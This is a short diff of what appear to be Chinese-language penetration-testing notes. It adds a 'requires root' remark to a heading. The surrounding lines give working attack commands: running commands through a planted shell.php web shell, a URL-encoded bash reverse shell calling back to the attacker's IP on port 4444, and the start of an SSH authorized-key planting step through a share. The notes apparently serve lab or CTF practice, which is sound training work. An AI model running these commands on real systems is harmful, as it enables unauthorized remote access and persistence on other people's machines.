@@ -21,7 +21,7 @@ curl 'http://192.168.1.6/shell.php?c=id'
 # 4. 直接反弹
 curl 'http://192.168.1.6/shell.php?c=bash%20-i%20>%26%20/dev/tcp/你IP/4444%200>%261'
 
-如果是用户home目录
+如果是用户home目录(需要root)
 # 1. 在本机Kali生成密钥
 ssh-keygen -t rsa
 # 2. 往共享里塞公钥
